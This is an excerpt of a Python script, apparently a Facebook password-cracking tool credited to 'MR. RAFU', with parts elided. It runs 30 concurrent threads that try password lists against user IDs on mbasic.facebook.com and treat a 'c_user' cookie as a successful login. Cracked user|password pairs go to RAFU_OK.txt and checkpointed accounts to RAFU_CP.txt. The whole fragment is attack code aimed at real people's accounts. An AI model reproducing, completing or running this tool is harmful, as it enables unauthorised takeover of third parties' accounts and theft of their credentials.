...
from concurrent.futures import ThreadPoolExecutor as sarfrazRAFU
...
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           MR. RAFU

\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          MR.RAFU

\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           Rafu-Green
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRAFU_OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mRAFU_CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back RAFU Menu ")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[RAFU] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [RAFU-OK] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('RAFU_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [RAFU-CP] %s | %s ' % (M, user, pw))

                        wrt = '%s|%s' % (user,pw)

                        cp.append(wrt)

                        open('RAFU_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            with sarfrazRAFU(max_workers=30) as RAFUworld:
                ...
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    ...
                    try:
                        ...
                        RAFUworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
